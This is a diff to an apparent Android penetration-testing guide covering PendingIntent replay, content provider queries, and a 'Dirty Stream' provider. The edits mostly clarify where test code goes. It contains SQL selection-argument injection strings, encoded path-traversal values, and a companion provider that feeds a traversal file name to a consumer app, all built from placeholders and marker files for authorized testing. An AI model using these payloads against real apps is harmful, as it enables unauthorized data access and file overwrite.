@@ -41,7 +41,7 @@
 
 ### PendingIntent Fill-In and Replay
 
-* **Input:** obtain the actual target-created `PendingIntent` through the exposed callback/result/share flow. Creating a token in your companion only tests your companion. In the receiving Activity, substitute the actual extra name and a destination of the same component type as the token (activity/service/broadcast).
+* **Input:** obtain the actual target-created `PendingIntent` through the exposed callback/result/share flow. Creating a token in your companion only tests your companion. Add the snippet to the companion Activity that receives the token, in `onCreate()` or the callback handling that result; use that Activity's incoming `intent`, the actual extra name, and a destination of the same component type as the token (activity/service/broadcast).
 	* ```kotlin
 		val token = intent.getParcelableExtra<android.app.PendingIntent>("REPLACE_TOKEN_EXTRA")
 		    ?: error("Target PendingIntent missing")
@@ -66,14 +66,14 @@
 
 ## Provider Operation Matrix
 
-* **Companion Activity, Kotlin:** query one known item under the companion UID; inspect file metadata and the returned stream independently.
+* **Companion Activity source, Kotlin:** place this code in an Activity method or test button callback. It queries one known item under the companion UID; inspect file metadata and the returned stream independently.
 	* ```kotlin
 		val uri = android.net.Uri.parse("<owned-item-content-uri>")
 		contentResolver.query(uri, arrayOf("<known-column>"), null, null, null)?.use { cursor ->
 				android.util.Log.i("IPCProbe", "rows=${cursor.count}; columns=${cursor.columnNames.joinToString()}")
 		}
 		```
-* **Granted file URI, Kotlin:** requires a file-serving URI rather than a database route.
+* **Companion Activity source, Kotlin:** place this code in an Activity method or test button callback. It requires a granted file-serving URI, not a database route.
 	* ```kotlin
 		val fileUri = android.net.Uri.parse("<granted-test-file-uri>")
 		contentResolver.openInputStream(fileUri)?.use { stream ->
@@ -90,14 +90,14 @@
 
 ## Provider Injection and File Traversal
 
-* **Selection argument injection:** use a code-discovered string-valued field and the valid provider query from [Component Testing](component-testing.md#test-scoped-reads). Replace one `--selection-args` value, not the SQL selection template itself; otherwise you may only be testing the intentionally supported raw selection language.
+* **Selection argument injection:** these are string payloads, not scripts. In the Drozer shell, use the [provider query command](component-testing.md#test-scoped-reads); keep the observed URI, projection and `--selection` template, and replace only one `--selection-args` value per run with a code-discovered string-valued field. Changing the SQL selection template instead can test an intentionally supported query language.
 	* ```text
 		REPLACE_A_VALUE'
 		REPLACE_A_VALUE' OR id=REPLACE_B_NUMERIC_ID --
 		REPLACE_A_VALUE' AND '1'='2
 		```
 * Replace `id` and the value type according to the actual query construction. **Confirm:** a quoted argument changes query logic and returns a forbidden known row or enables an unauthorized operation. An error alone is a lead; a bound argument returning no row is expected.
-* **File-route traversal:** append each candidate to the real file-serving route and use the existing provider read command. Put a marker outside the intended exposed root but within a path readable by the provider's UID.
+* **File-route traversal:** put a marker outside the intended exposed root but within a path readable by the provider's UID. In the Drozer shell, use the [file-read command](component-testing.md#test-scoped-reads), replacing the route/path portion of the observed content URI with one candidate per run. These are path values, not commands or scripts.
 	* ```text
 		../marker-outside-root.txt
 		%2e%2e%2fmarker-outside-root.txt
@@ -107,7 +107,7 @@
 
 ## Dirty Stream: Untrusted Provider Metadata
 
-* **Companion provider:** add this Kotlin class to an existing Android test app. Begin with `dirty-stream-marker.txt`, then change `displayName` to `../files/dirty-stream-marker.txt` or the relative path derived from the consumer's actual import directory. The data returned remains the same marker.
+* **Companion provider source (Kotlin):** create `app/src/main/java/com/example/ipcprobe/ProbeProvider.kt` in the companion Android test app, matching the package declaration. Begin with `dirty-stream-marker.txt`, then change `displayName` to `../files/dirty-stream-marker.txt` or the relative path derived from the consumer's actual import directory. The provider returns the same marker data.
 	* ```kotlin
 		package com.example.ipcprobe
 
@@ -140,7 +140,7 @@
 		    override fun delete(uri: android.net.Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
 		}
 		```
-* **Manifest:** place this provider inside the companion's `<application>`; keep the authority synchronized with the URI below.
+* **Companion manifest (XML):** add this element inside the companion app's `<application>` in `app/src/main/AndroidManifest.xml`; keep the authority synchronized with the content URI below.
 	* ```xml
 		<provider xmlns:android="http://schemas.android.com/apk/res/android"
 		    android:name="com.example.ipcprobe.ProbeProvider"
@@ -148,7 +148,7 @@
 		    android:exported="false"
 		    android:grantUriPermissions="true" />
 		```
-* **Send from the companion Activity:** this grants access as the provider owner. Replace the consumer package and MIME type with the observed import contract; an `ACTION_OPEN_DOCUMENT` result flow needs its matching result handler instead of `ACTION_SEND`.
+* **Companion Activity source (Kotlin):** run this from the companion Activity's `onCreate()` or a test button callback. It sends the URI as its owning provider app. Replace the consumer package and MIME type with the observed import contract; an `ACTION_OPEN_DOCUMENT` flow needs its matching result handler instead of `ACTION_SEND`.
 	* ```kotlin
 		val stream = android.net.Uri.parse("content://com.example.ipcprobe.files/marker")
 		startActivity(android.content.Intent(android.content.Intent.ACTION_SEND).apply {
@@ -159,7 +159,7 @@
 		    addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
 		})
 		```
-* **Build/install:** use the existing companion [build and launch commands](#intent-result-and-binder-boundaries); the wrapper differs by host OS.
+* **Host terminal:** from the companion project root, use the existing [build and launch commands](#intent-result-and-binder-boundaries); the wrapper differs by host OS.
 {% tabs %}
 {% tab title="Linux" %}
 * ```bash
